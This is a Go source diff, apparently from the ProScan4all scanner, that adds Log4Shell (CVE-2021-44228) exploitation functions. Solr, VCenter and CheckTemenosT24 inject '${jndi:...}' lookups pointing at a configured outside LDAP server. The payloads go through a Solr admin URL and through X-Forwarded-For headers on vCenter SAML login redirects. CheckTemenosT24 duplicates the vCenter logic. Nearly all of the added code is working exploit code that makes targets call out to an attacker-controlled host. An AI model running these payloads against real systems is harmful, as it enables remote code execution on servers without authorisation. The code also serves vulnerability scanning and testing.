@@ -1,12 +1,86 @@
 package log4j
 
 import (
+	"fmt"
 	"github.com/hktalent/ProScan4all/lib/util"
 	"github.com/hktalent/ProScan4all/pkg/jndi"
 	"net/url"
 	"regexp"
 	"strings"
 )
+
+// https://192.168.10.198/ui/#/login
+var UrlPayload = []string{"/solr/admin/cores?action=${jndi:%s}"}
+
+var RegVCenter = regexp.MustCompile(`(http.*?\?SAMLRequest=)`)
+
+func CheckX3(u string) bool {
+	if oU, err := url.Parse(u); nil == err {
+		a := []string{oU.Scheme + "://" + oU.Host + "/x3.jsp"}
+
+		for _, k := range a {
+			if r, err := util.DoPost(k, map[string]string{}, strings.NewReader("")); nil == err {
+				defer r.Body.Close()
+			}
+		}
+
+	}
+	return false
+}
+
+// Temenos T24
+// https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell?referrer=featured
+func CheckTemenosT24(u string) {
+	if oU, err := url.Parse(u); nil == err {
+		szUrl := oU.Scheme + "://" + oU.Host + "/ui/login"
+		if r, err := util.DoGet(szUrl, map[string]string{}); nil == err {
+			defer r.Body.Close()
+			if a := r.Header.Get("Location"); "" != a {
+				if x := RegVCenter.FindAllString(a, -1); 0 < len(x) && -1 < strings.Index(x[0], "SAML2/SSO") {
+					ldapServer := "${jndi:" + SetLdapHost(oU.Host) + "}"
+					util.DoGet(x[0], map[string]string{
+						"X-Forwarded-For": ldapServer,
+					})
+				}
+			}
+		}
+	}
+}
+
+// 这里可以考虑对host进行编码，避免明文传输
+func SetLdapHost(s string) string {
+	return fmt.Sprintf(util.GetVal("ldapServer"), s)
+}
+
+func Solr(u string) {
+	if oU, err := url.Parse(u); nil == err {
+		for _, k := range UrlPayload {
+			k = fmt.Sprintf(k, SetLdapHost(oU.Host))
+			szUrl := oU.Scheme + "://" + oU.Host + k
+			if r, err := util.DoGet(szUrl, map[string]string{}); nil == err {
+				defer r.Body.Close()
+			}
+		}
+	}
+}
+
+// https://www.sprocketsecurity.com/resources/how-to-exploit-log4j-vulnerabilities-in-vmware-vcenter
+func VCenter(u string) {
+	if oU, err := url.Parse(u); nil == err {
+		szUrl := oU.Scheme + "://" + oU.Host + "/ui/login"
+		if r, err := util.DoGet(szUrl, map[string]string{}); nil == err {
+			defer r.Body.Close()
+			if a := r.Header.Get("Location"); "" != a {
+				if x := RegVCenter.FindAllString(a, -1); 0 < len(x) && -1 < strings.Index(x[0], "SAML2/SSO") {
+					ldapServer := "${jndi:" + SetLdapHost(oU.Host) + "}"
+					util.DoGet(x[0], map[string]string{
+						"X-Forwarded-For": ldapServer,
+					})
+				}
+			}
+		}
+	}
+}
 
 func Check(u string, finalURL string) bool {
 	if (util.CeyeApi != "" && util.CeyeDomain != "") || jndi.JndiAddress != "" {
